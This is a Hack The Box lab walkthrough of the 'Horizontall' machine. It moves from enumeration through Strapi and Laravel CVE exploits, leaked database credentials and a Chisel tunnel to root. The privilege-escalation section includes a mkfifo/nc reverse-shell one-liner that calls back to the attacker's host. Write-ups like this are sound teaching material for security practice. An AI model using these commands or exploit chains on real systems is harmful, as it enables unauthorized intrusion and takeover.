# HTB - Horizontall

#### Ip: 10.10.11.105
#### Name: Horizontall
#### Rating: Easy

----------------------------------------------------------------------

Horizontall.png

### Enumeration

I'll begin enumerating this box by scanning all TCP ports with Nmap and use the `--min-rate 10000` flag to speed things up:

```text
┌──(ryan㉿kali)-[~/HTB/Horizontall]
└─$ sudo nmap -p- --min-rate 10000 -sC -sV 10.10.11.105
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-04 11:08 CDT
Nmap scan report for 10.10.11.105
Host is up (0.090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
```

Based on these results lets add horizontall.htb to `/etc/hosts`

Checking out the page on port 80 we find a site with no links or any functionality.

horizontall_site.png

But taking a look at the page source we can see a JS directory that looks out of place:

horizontall_link.png

Heading to this site reveals a bunch of code with no styling or formatting:

horizontall_code.png

Wanting to inspect this further, I copy the code into https://lelinhtinh.github.io/de4js/ to clean it up and make it more readable.

Skimming through the cleaned-up output I notice a VHOST:

horizontall_vhost.htb

Adding this to `/etc/hosts` and heading to the site we see a basing "Welcome" message.

Kicking off some directory scanning we find an `/admin` page:

```text
┌──(ryan㉿kali)-[~/HTB/Horizontall]
└─$ feroxbuster -u http://api-prod.horizontall.htb/       

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://api-prod.horizontall.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        3w       60c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       19l       33w      413c http://api-prod.horizontall.htb/
200      GET       16l      101w      854c http://api-prod.horizontall.htb/admin
200      GET       16l      101w      854c http://api-prod.horizontall.htb/Admin
403      GET        1l        1w       60c http://api-prod.horizontall.htb/users
200      GET        1l       21w      507c http://api-prod.horizontall.htb/reviews
200      GET       16l      101w      854c http://api-prod.horizontall.htb/ADMIN
403      GET        1l        1w       60c http://api-prod.horizontall.htb/Users
200      GET        1l       21w      507c http://api-prod.horizontall.htb/Reviews
[####################] - 51s    30000/30000   0s      found:8       errors:0      
[####################] - 51s    30000/30000   586/s   http://api-prod.horizontall.htb/ 
```

Heading to the admin page we find a strapi login:

horizontall_strapi_login.png

### Exploitation

Looking for public exploits I find this interesting repo: https://github.com/glowbase/CVE-2019-19609

Looks like the exploit is targeting two separate vulnerabilities in strapi, weak password recovery funtionality, as well as a command injection vulnerability.

Lets give it a shot:
```
┌──(ryan㉿kali)-[~/HTB/Horizontall]
└─$ python strapi_exploit.py http://api-prod.horizontall.htb/ 10.10.14.78 443 
========================================================
|    STRAPI REMOTE CODE EXECUTION (CVE-2019-19609)     |
========================================================
[+] Checking Strapi CMS version
[+] Looks like this exploit should work!
[+] Executing exploit
```

Which catches me a shell back in my listener:

```
┌──(ryan㉿kali)-[~/HTB/Horizontall]
└─$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.78] from (UNKNOWN) [10.10.11.105] 44810
/bin/sh: 0: can't access tty; job control turned off
$ whoami
strapi
$ hostname
horizontall
```

And I can now grab the user.txt flag:

horizontall_user.png

### Privilege Escalation

Loading linpeas on to the target to help enumerate a privilege escalation vector, I notice that a few more ports are open internally:

horizontall_ports.png

We also found in the linpeas results developer's password:

```
  "defaultConnection": "default",
  "connections": {
    "default": {
      "connector": "strapi-hook-bookshelf",
      "settings": {
        "client": "mysql",
        "database": "strapi",
        "host": "127.0.0.1",
        "port": 3306,
        "username": "developer",
        "password": "#J!:F9Zt2u"
```

We can login to mysql using these credentials:
```
strapi@horizontall:/tmp$ mysql -u developer -p'#J!:F9Zt2u'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 31
Server version: 5.7.35-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| strapi             |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use strapi;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------------+
| Tables_in_strapi             |
+------------------------------+
| core_store                   |
| reviews                      |
| strapi_administrator         |
| upload_file                  |
| upload_file_morph            |
| users-permissions_permission |
| users-permissions_role       |
| users-permissions_user       |
+------------------------------+
8 rows in set (0.00 sec)

mysql> select * from strapi_administrator;
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
| id | username | email                 | password                                                     | resetPasswordToken | blocked |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
|  3 | admin    | admin@horizontall.htb | $2a$10$wlByKb3sm7DHpu3l7kXZ/e92KFLlhfJ839lDUXb8Q7zPhHfshtp/m | NULL               |    NULL |
+----+----------+-----------------------+--------------------------------------------------------------+--------------------+---------+
1 row in set (0.00 sec)
```

But unfortunately I was unable to crack this password.

Going back to the open internal ports, I can use Chisel to set up a tunnel:

On my Kali box:
```
./chisel_1.8.1_linux_arm64 server -p 8080 --reverse
```

On the target:
```
./chisel_1.8.1_linux_amd64 client 10.10.14.78:8080 R:8000:127.0.0.1:8000
```

We can now navigate to 127.0.0.1:8000 in the browser and find a Laravel page.

horizontal_laravel.png

Looking for exploits I find: https://github.com/joshuavanderpoll/CVE-2021-3129 which exploits Laravel version 8 and earlier that are running in debug mode.

And we can confirm it works, and is running as root to boot:

```
┌──(ryan㉿kali)-[~/HTB/Horizontall]
└─$ python CVE-2021-3129.py --host="127.0.0.1:8000/" --force

   _____   _____   ___ __ ___ _    _____ ___ ___ 
  / __\ \ / / __|_|_  )  \_  ) |__|__ / |_  ) _ \
 | (__ \ V /| _|___/ / () / /| |___|_ \ |/ /\_, /
  \___| \_/ |___| /___\__/___|_|  |___/_/___|/_/
 https://github.com/joshuavanderpoll/CVE-2021-3129

[•] Using PHPGGC: https://github.com/ambionics/phpggc
[@] Starting exploit on "http://127.0.0.1:8000/"...
[@] Testing vulnerable URL "http://127.0.0.1:8000/_ignition/execute-solution"...
[@] Searching Laravel log file path...
[•] Laravel seems to be running on a Linux based machine.
[√] Laravel log path: "/home/developer/myproject/storage/logs/laravel.log".
[•] Laravel version found: "8.43.0".
[•] Use "?" for a list of all possible actions.
[?] Please enter a command to execute: ?
[•] Available commands:
    exit                       -  Exit program.
    help                       -  Shows available commands.
    clear_logs                 -  Clears Laravel logs.
    execute <command>          -  Execute system command.
    write <text>               -  Write to log file.
    patch <env/index/private>  -  Patch the vulnerability.
    patches                    -  Detailed information about patch modes
[?] Please enter a command to execute: execute whoami
[@] Executing command "whoami"...
[@] Generating payload...
[√] Generated 1 payloads.
[@] Trying chain laravel/rce2 [1/1]...
[@] Clearing logs...
[@] Causing error in logs...
[√] Caused error in logs.
[@] Sending payloads...
[√] Sent payload.
[@] Converting payload...
[√] Converted payload.
[√] Result:

root
```

I can then use this to generate a reverse shell:
```
[?] Please enter a command to execute: execute rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.78 80 >/tmp/f
[@] Executing command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.78 80 >/tmp/f"...
[@] Generating payload...
[√] Generated 1 payloads.
```

And catch a shell back as root:

```
┌──(ryan㉿kali)-[~/HTB/Horizontall]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.78] from (UNKNOWN) [10.10.11.105] 46266
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# hostname
horizontall
```

Unfortuantely this exploit crashes pretty fast, so you'll either want to fully stabilize your shell, or grab that root flag quickly.

horizontall_root.png

Thanks for following along!

-Ryan

----------------------------------